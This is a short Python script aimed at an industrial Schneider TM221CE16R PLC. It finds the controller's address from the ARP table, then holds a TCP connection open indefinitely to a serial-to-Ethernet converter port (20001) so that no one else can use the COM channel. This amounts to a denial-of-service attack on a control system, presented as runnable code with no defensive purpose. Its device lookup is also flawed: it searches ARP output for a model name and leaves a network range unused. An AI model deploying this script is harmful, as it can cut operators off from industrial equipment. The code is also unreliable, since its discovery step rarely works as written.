import socket
import subprocess
import time

# Function to find the IP address of the PLC
def find_plc_ip():
    # Assuming the PLC is connected to the same network and responds to ping
    # This is a simple method and may need to be adapted based on your network setup
    network = "10.0.0.0/24"  # Change this to your network range
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "TM221CE16R" in line:  # Adjust this based on the actual name or MAC address of the PLC
                ip = line.split()[0]
                return ip
    except Exception as e:
        print(f"Error finding PLC IP: {e}")
    return None

# Function to block the serial COM port
def block_com_port(ip, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the serial to Ethernet converter
        sock.connect((ip, port))
        print(f"Connected to {ip} on port {port}. Holding the connection open to block the port.")
        # Hold the connection open indefinitely
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Error blocking COM port: {e}")

# Main function
def main():
    # Find the IP address of the PLC
    plc_ip = find_plc_ip()
    if plc_ip is None:
        print("Could not find the PLC IP address.")
        return

    # Define the port to block (e.g., 20001 for COM1)
    com_port = 20001  # Change this to the appropriate port number

    # Block the COM port
    block_com_port(plc_ip, com_port)

if __name__ == "__main__":
    main()